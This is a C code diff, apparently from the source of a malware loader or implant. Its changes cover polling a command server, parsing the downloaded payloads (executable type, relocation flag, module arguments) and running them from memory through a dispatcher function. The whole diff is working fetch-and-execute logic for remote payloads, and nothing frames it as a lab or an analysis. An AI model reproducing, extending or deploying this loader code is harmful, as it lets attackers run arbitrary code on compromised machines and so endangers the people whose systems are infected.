@@ -5,18 +5,7 @@
 #include "../../includes/parser/parser.h"
 
 
-BOOL LdrLoadAndRun(LdrTask info, BOOL CleanUpAfter) {
-	switch (info.code) {
-	case TASK_LOAD:
-		if(!LdrRunExe(info))
-			return FALSE;
-		return TRUE;
-	// case FILE_DLL:
-	// 	if(!LdrRunDLL(info))
-	// 		return FALSE;
-	// 	return TRUE;
-	}
-}
+
 
 
 #ifdef LOAD_AND_EXIT
@@ -72,6 +61,9 @@ LdrTask LdrPullFile() {
 	ParserRead *pr = ParserInitRead(payload, payloadSize);
 	task.code = ParserRead4(pr);
 	task.FileType = ParserRead4(pr);
+	if(task.FileType == FILE_EXE) {
+		task.hasReloc = ParserRead4(pr);
+	}
 	task.DataSize = ParserRead4(pr);
 
 	task.Data = ldr->win32->LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, task.DataSize);
@@ -108,6 +100,7 @@ void LdrInitPoll() {
 LdrTask LdrPollServer() {
     LdrTask task = {0};
     DWORD PayloadSize = 0;
+    DWORD HasArgs = 0;
     DBGA("[*] Polling Server\n");
     PVOID Addr = NwPollServer(&PayloadSize, sPollBody, sPollSize);
     if(!Addr) {
@@ -126,6 +119,12 @@ LdrTask LdrPollServer() {
         return task;
     }
     task.FileType = ParserRead4(pr);
+    if(task.FileType == FILE_EXE) {
+    	task.hasReloc = ParserRead4(pr);
+    }
+    if(task.code == TASK_MODULE) {
+    	HasArgs = ParserRead4(pr);
+    }
     task.DataSize = ParserRead4(pr);
     PBYTE Data = ldr->win32->LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, task.DataSize);
     if(!Data) {
@@ -136,12 +135,28 @@ LdrTask LdrPollServer() {
         return task;
     }
     ParserReadBytes(pr, Data, task.DataSize);
+    PCHAR Args = NULL;
+    if(HasArgs) {
+    	Args = ParserReadString(pr);
+    }
 
     task.Data = Data;
     task.ok = TRUE;
+    task.args = Args;
     ldr->win32->LocalFree(Addr);
     return task; 
 
 }
 #endif
+
+BOOL LdrLoadAndRun(LdrTask info, BOOL CleanUpAfter) {
+	switch (info.code) {
+	case TASK_LOAD:
+		if(!LdrRunExe(info))
+			return FALSE;
+		return TRUE;
+	default:
+		return FALSE;
+	}
+}
 
